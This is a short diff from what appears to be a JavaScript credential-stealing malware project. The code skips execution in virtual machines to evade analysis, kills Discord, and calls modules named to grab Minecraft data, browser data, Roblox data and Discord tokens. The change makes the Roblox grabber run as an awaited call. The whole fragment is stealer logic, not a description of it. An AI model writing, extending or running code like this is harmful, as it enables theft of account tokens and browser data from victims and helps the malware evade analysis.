@@ -27,7 +27,7 @@ if (config.vmProtect && checkVM()) {
     config.discord.killProcess && require('./functions/kill-discord');
     require('./functions/grab-mc');
     require('./functions/grab-browsers-data');
-    require('./functions/grab-roblox');
+    await require('./functions/grab-roblox')();
 
     await require('./functions/grab-discord-token');
     await sleep(500);
